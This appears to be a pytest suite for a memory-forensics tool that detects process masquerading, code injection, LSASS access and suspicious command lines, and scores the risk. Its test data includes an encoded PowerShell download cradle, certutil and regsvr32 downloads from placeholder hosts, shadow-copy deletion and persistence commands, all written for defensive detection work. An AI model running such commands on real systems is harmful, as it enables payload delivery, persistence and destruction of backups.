"""Process model, detection rules, command-line analysis, IOC extraction and risk scoring."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.services.analysis.process_model import build_process_views, find_parent, normalize_path
from app.services.detection.base import RULE_REGISTRY, AnalysisContext, DetectionRule, register
from app.services.detection.cmdline import analyze_cmdline, decode_powershell
from app.services.detection.engine import DetectionEngine
from app.services.ioc.extractor import extract_iocs
from app.services.ioc.patterns import classify_ip, is_valid_domain
from app.services.scoring.risk import ScoringModel, score_findings, score_processes
from app.services.volatility.parsers import (
    HandleRec,
    ModuleRecord,
    NetRecord,
    ParsedEvidence,
    PrivilegeRecord,
    ProcRecord,
    RegionRecord,
)

T0 = datetime(2026, 1, 1, 8, 0, tzinfo=timezone.utc)


def proc(pid, ppid, name, minutes=0, path=None, cmd=None, exit_min=None):
    return ProcRecord(pid=pid, ppid=ppid, name=name, create_time=T0 + timedelta(minutes=minutes),
                      exit_time=T0 + timedelta(minutes=exit_min) if exit_min is not None else None,
                      path=path, cmdline=cmd)


BASE = [
    proc(4, 0, "System"),
    proc(500, 4, "smss.exe", 0, r"C:\Windows\System32\smss.exe"),
    proc(600, 500, "wininit.exe", 1, r"C:\Windows\System32\wininit.exe"),
    proc(640, 600, "services.exe", 1, r"C:\Windows\System32\services.exe"),
    proc(660, 600, "lsass.exe", 1, r"C:\Windows\System32\lsass.exe"),
    proc(800, 640, "svchost.exe", 2, r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs"),
    proc(3000, 2900, "explorer.exe", 5, r"C:\Windows\explorer.exe"),
]


def make_ctx(kb, extra_procs=(), psscan_only=(), **evidence):
    ev = ParsedEvidence(pslist=[*BASE, *extra_procs], psscan=[*BASE, *extra_procs, *psscan_only], **evidence)
    ev.available |= {"windows.pslist", "windows.psscan", "windows.cmdline", "windows.dlllist", "windows.malfind",
                     "windows.netscan", "windows.handles", "windows.privileges", "windows.ldrmodules",
                     "windows.vadinfo", "windows.vadyarascan"}
    views = build_process_views(ev)
    return AnalysisContext(views, ev, kb)


def run_rule(rule_id, ctx):
    return list(RULE_REGISTRY[rule_id]().evaluate(ctx))


# ------------------------------------------------------------------ process model
def test_normalize_path_variants():
    assert normalize_path(r"\Device\HarddiskVolume3\Windows\System32\a.exe") == r"\windows\system32\a.exe"
    assert normalize_path(r"\SystemRoot\System32\smss.exe") == r"\windows\system32\smss.exe"
    assert normalize_path(r'"C:\Users\Public\x.exe"') == r"\users\public\x.exe"


def test_hidden_and_terminated_processes(kb):
    ctx = make_ctx(kb, psscan_only=[proc(7000, 800, "hidden.exe", 10), proc(7100, 800, "gone.exe", 9, exit_min=9)])
    by = {p.pid: p for p in ctx.processes}
    assert by[7000].is_hidden_candidate and not by[7000].in_pslist
    assert by[7100].is_terminated and not by[7100].is_hidden_candidate


def test_parent_lookup_respects_pid_reuse():
    old_parent = build_process_views(ParsedEvidence(pslist=[proc(100, 4, "old.exe", 0, exit_min=1)]))[0]
    new_parent = build_process_views(ParsedEvidence(pslist=[proc(100, 4, "new.exe", 30)]))[0]
    child = build_process_views(ParsedEvidence(pslist=[proc(200, 100, "child.exe", 5)]))[0]
    assert find_parent(child, [old_parent, new_parent]).name == "old.exe"


def test_truncated_image_name_recovered_from_path():
    ev = ParsedEvidence(pslist=[proc(9, 4, "RuntimeBroker.", 1, r"C:\Windows\System32\RuntimeBroker.exe")])
    assert build_process_views(ev)[0].name == "RuntimeBroker.exe"


# ------------------------------------------------------------------ rules
def test_masquerading_and_path_rules(kb):
    ctx = make_ctx(kb, [proc(4528, 3000, "svchost.exe", 10, r"C:\Users\Public\svchost.exe")])
    masq = run_rule("RULE_MASQUERADING", ctx)
    assert len(masq) == 1 and masq[0].pid == 4528 and masq[0].severity == "high"
    path = run_rule("RULE_SUSPICIOUS_PATH", ctx)
    assert [f.pid for f in path] == [4528]
    assert all(f.pid != 800 for f in masq)  # genuine svchost is not flagged


def test_typosquat_detection_without_false_positive_on_truncation(kb):
    ctx = make_ctx(kb, [proc(4600, 3000, "scvhost.exe", 10, r"C:\Temp\scvhost.exe"),
                        proc(4601, 3000, "taskhost.exe", 10, r"C:\Windows\System32\taskhost.exe")])
    pids = {f.pid for f in run_rule("RULE_MASQUERADING", ctx)}
    assert 4600 in pids and 4601 not in pids


def test_suspicious_parent_rule(kb):
    ctx = make_ctx(kb, [proc(4012, 3000, "WINWORD.EXE", 10), proc(4388, 4012, "powershell.exe", 11),
                        proc(4528, 4388, "svchost.exe", 12, r"C:\Windows\System32\svchost.exe")])
    found = {f.pid: f for f in run_rule("RULE_SUSPICIOUS_PARENT", ctx)}
    assert set(found) == {4388, 4528}
    assert "expected to be started by services.exe" in found[4528].finding


def test_process_hiding_requires_cross_view(kb):
    ctx = make_ctx(kb, psscan_only=[proc(7000, 800, "hidden.exe", 10)])
    assert [f.pid for f in run_rule("RULE_PROCESS_HIDING", ctx)] == [7000]
    ctx.evidence.available.discard("windows.pslist")
    result = DetectionEngine().run(ctx)
    assert "RULE_PROCESS_HIDING" in result.not_evaluated


def test_duplicate_singleton(kb):
    ctx = make_ctx(kb, [proc(4700, 3000, "lsass.exe", 20, r"C:\Windows\System32\lsass.exe")])
    assert {f.pid for f in run_rule("RULE_DUPLICATE_SYSTEM_PROCESS", ctx)} == {660, 4700}


def region(pid, start, prot, first=b"", private=True):
    return RegionRecord(pid=pid, process="x", start=start, end=start, protection=prot, tag="VadS",
                        private_memory=private, commit_charge=1, first_bytes=first, has_pe_header=first[:2] == b"MZ")


def test_memory_rules_and_jit_confidence_reduction(kb):
    ctx = make_ctx(kb, [proc(900, 3000, "evil.exe", 10, r"C:\x\evil.exe"),
                        proc(901, 3000, "chrome.exe", 10, r"C:\Program Files\chrome.exe")],
                   malfind=[region(900, "0x10000", "PAGE_EXECUTE_READWRITE", b"MZ\x90\x00" + b"\x01" * 12),
                            region(900, "0x20000", "PAGE_EXECUTE_READWRITE", b"\xfc\x48\x83\xe4\xf0\xe8" + b"\x01" * 10),
                            region(901, "0x30000", "PAGE_EXECUTE_READWRITE", b"\x48\x89\x5c\x24" + b"\x01" * 12)])
    pe = run_rule("RULE_PE_IN_PRIVATE_MEMORY", ctx)
    assert [f.pid for f in pe] == [900] and pe[0].confidence == 0.8
    assert [f.pid for f in run_rule("RULE_SHELLCODE_INDICATOR", ctx)] == [900]
    exec_priv = {f.pid: f for f in run_rule("RULE_EXECUTABLE_PRIVATE_MEMORY", ctx)}
    assert exec_priv[901].confidence < exec_priv[900].confidence and exec_priv[901].severity == "low"


def test_dll_rules(kb):
    ctx = make_ctx(kb, [proc(5120, 3000, "rundll32.exe", 10, r"C:\Windows\System32\rundll32.exe")],
                   modules=[ModuleRecord(5120, "rundll32.exe", "rundll32.exe", r"C:\Windows\System32\rundll32.exe", "0x1", 1),
                            ModuleRecord(5120, "rundll32.exe", "msupd.dll", r"C:\Users\a\AppData\Local\Temp\msupd.dll", "0x2", 1),
                            ModuleRecord(5120, "rundll32.exe", "version.dll", r"C:\Users\a\Desktop\version.dll", "0x3", 1)])
    f = run_rule("RULE_SUSPICIOUS_DLL_PATH", ctx)
    assert len(f) == 1 and f[0].severity == "high" and len(f[0].evidence) == 2


def test_network_rule(kb):
    net = [NetRecord("TCPv4", "10.0.0.5", 50000, "203.0.113.9", 4444, "ESTABLISHED", 4528, "x.exe", None, None),
           NetRecord("TCPv4", "10.0.0.5", 50001, "10.0.0.1", 4444, "ESTABLISHED", 4528, "x.exe", None, None),
           NetRecord("TCPv4", "10.0.0.5", 50002, "198.51.100.3", 443, "ESTABLISHED", 5000, "notepad.exe", None, None),
           NetRecord("TCPv4", "10.0.0.5", 50003, "192.0.2.10", 443, "ESTABLISHED", 800, "svchost.exe", None, None)]
    ctx = make_ctx(kb, [proc(4528, 3000, "x.exe", 10), proc(5000, 3000, "notepad.exe", 10)], network=net)
    found = {f.pid: f for f in run_rule("RULE_SUSPICIOUS_NETWORK", ctx)}
    assert set(found) == {4528, 5000}  # internal 4444 and svchost:443 not flagged
    assert found[4528].severity == "high" and set(ctx.flagged_connections) == {0, 2}


def test_lsass_handle_rule_does_not_trust_masquerading_names(kb):
    handles = [HandleRec(4528, "svchost.exe", "0x4", "Process", "0x1010", "lsass.exe Pid 660"),
               HandleRec(800, "svchost.exe", "0x4", "Process", "0x1010", "lsass.exe Pid 660")]
    ctx = make_ctx(kb, [proc(4528, 3000, "svchost.exe", 10, r"C:\Users\Public\svchost.exe")], handles=handles)
    assert [f.pid for f in run_rule("RULE_LSASS_ACCESS", ctx)] == [4528]


def test_debug_privilege_rule(kb):
    privs = [PrivilegeRecord(4528, "x", "SeDebugPrivilege", "Present,Enabled", True),
             PrivilegeRecord(660, "lsass.exe", "SeDebugPrivilege", "Present,Enabled", True)]
    ctx = make_ctx(kb, [proc(4528, 3000, "tool.exe", 10)], privileges=privs)
    assert [f.pid for f in run_rule("RULE_DEBUG_PRIVILEGE", ctx)] == [4528]


def test_engine_isolates_failing_rules(kb):
    @register
    class _Broken(DetectionRule):
        rule_id = "RULE_TEST_BROKEN"
        title = category = severity = description = "x"
        points = 1

        def evaluate(self, ctx):
            raise RuntimeError("boom")

    try:
        result = DetectionEngine().run(make_ctx(kb))
        assert "RULE_TEST_BROKEN" in result.errors
    finally:
        RULE_REGISTRY.pop("RULE_TEST_BROKEN")


def test_disabled_rules_are_reported(kb):
    result = DetectionEngine(enabled_rules={"RULE_MASQUERADING"}).run(make_ctx(kb))
    assert result.not_evaluated["RULE_SUSPICIOUS_PATH"] == "disabled by investigator"


def test_rule_output_shape(kb):
    ctx = make_ctx(kb, [proc(4528, 3000, "svchost.exe", 10, r"C:\Users\Public\svchost.exe")])
    out = run_rule("RULE_MASQUERADING", ctx)[0].to_rule_output()
    assert set(out) == {"rule_id", "severity", "finding", "evidence", "confidence", "recommendation"}


# ------------------------------------------------------------------ command lines
def test_encoded_powershell_is_decoded_and_payload_analysed(kb):
    import base64

    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://a.example/x')".encode("utf-16-le")).decode()
    matches, decoded = analyze_cmdline(f"powershell.exe -NoP -W Hidden -EncodedCommand {enc}", kb)
    ids = {m.pattern_id for m in matches}
    assert {"PS_ENCODED_COMMAND", "PS_HIDDEN_WINDOW", "DOWNLOAD_CRADLE", "INVOKE_EXPRESSION"} <= ids
    assert "DownloadString" in decoded
    assert any(m.in_decoded_payload for m in matches)


@pytest.mark.parametrize("cmd,pattern", [
    ("vssadmin.exe delete shadows /all /quiet", "SHADOW_COPY_DELETION"),
    ("certutil -urlcache -split -f http://x.example/a a.exe", "CERTUTIL_DOWNLOAD_DECODE"),
    ("mshta.exe javascript:alert(1)", "MSHTA_REMOTE_OR_SCRIPT"),
    ('regsvr32 /s /n /u /i:http://x.example/f.sct scrobj.dll', "REGSVR32_SCRIPTLET"),
    (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y", "RUN_KEY_MODIFICATION"),
    ("schtasks /create /tn x /tr y", "SCHEDULED_TASK_CREATE"),
])
def test_lolbin_patterns(kb, cmd, pattern):
    assert pattern in {m.pattern_id for m in analyze_cmdline(cmd, kb)[0]}


def test_benign_commandlines_do_not_match(kb):
    for cmd in [r"C:\Windows\system32\svchost.exe -k netsvcs -p", '"C:\\Program Files\\App\\app.exe" --update',
                "powershell.exe -File C:\\Scripts\\backup.ps1"]:
        assert analyze_cmdline(cmd, kb)[0] == []
    assert decode_powershell("powershell -enc not_base64!!") is None


# ------------------------------------------------------------------ IOC
def test_domain_validation_filters_false_positives():
    assert is_valid_domain("update-check.example")
    assert not is_valid_domain("kernel32.dll")
    assert not is_valid_domain("System.Management.Automation")
    assert classify_ip("203.0.113.5") == "documentation" and classify_ip("10.1.1.1") == "private"
    assert classify_ip("8.8.8.8") == "public" and classify_ip("nonsense") is None


def test_ioc_extraction_on_demo_evidence(kb, demo_evidence):
    views = build_process_views(demo_evidence)
    ctx = AnalysisContext(views, demo_evidence, kb)
    det = DetectionEngine().run(ctx)
    scores = {k: v[0] for k, v in score_processes(det.findings, ScoringModel.from_config(kb.scoring)).items()}
    iocs = extract_iocs(ctx, scores)
    values = {(i.ioc_type, i.value) for i in iocs}
    assert ("ipv4", "203.0.113.45") in values
    assert ("domain", "update-check.example") in values  # extracted from the decoded PowerShell payload
    assert ("url", "http://update-check.example/stage2.ps1") in values
    assert ("mutex", "Global\\MSUpd_7f3a2c") in values
    assert not any(v.lower().startswith("c:\\windows\\system32") for t, v in values if t == "file_path")
    watch = [i for i in iocs if i.watchlist_match]
    assert watch and all(i.confidence == "high" for i in watch)


# ------------------------------------------------------------------ scoring
def _f(rule, cat, pts, conf, key="k"):
    from app.services.detection.base import FindingDraft

    return FindingDraft(rule, rule, cat, "high", "", [], conf, "", pts, process_key=key)


def test_scoring_formula_caps_and_bonus():
    model = ScoringModel.from_config(None)
    score, band, contributors = score_findings([_f("A", "memory", 25, 0.8), _f("B", "memory", 20, 0.6)], model)
    # 25*0.9=22.5->22, 20*0.8=16 -> 38 capped at 35
    assert score == 35 and band == "moderate"
    assert any(c["label"].startswith("cap: memory") and c["points"] == -3 for c in contributors)
    score2, _, c2 = score_findings([_f("A", "memory", 20, 1), _f("B", "path", 20, 1), _f("C", "network", 12, 1)], model)
    assert score2 == 20 + 20 + 12 + 10 and any(c["category"] == "corroboration" for c in c2)


def test_score_is_bounded_and_banded():
    model = ScoringModel.from_config(None)
    many = [_f(str(i), cat, 25, 1) for i, cat in enumerate(model.caps)]
    score, band, contributors = score_findings(many, model)
    assert score == 100 and band == "critical"
    assert sum(c["points"] for c in contributors) == 100
    assert [model.band(s) for s in (0, 29, 30, 59, 60, 79, 80)] == ["low", "low", "moderate", "moderate", "high",
                                                                        "high", "critical"]


def test_demo_scenario_end_to_end_scores(kb, demo_evidence):
    ctx = AnalysisContext(build_process_views(demo_evidence), demo_evidence, kb)
    det = DetectionEngine().run(ctx)
    scores = score_processes(det.findings, ScoringModel.from_config(kb.scoring))
    by_pid = {int(k.split("|")[0]): v for k, v in scores.items()}
    assert by_pid[4528][1] == "critical"  # masquerading svchost with injection + C2-like traffic
    assert by_pid[1868][1] == "low"  # Defender JIT memory stays low
    rules_4528 = {f.rule_id for f in det.findings if f.pid == 4528}
    assert {"RULE_MASQUERADING", "RULE_PE_IN_PRIVATE_MEMORY", "RULE_LSASS_ACCESS", "RULE_DEBUG_PRIVILEGE"} <= rules_4528
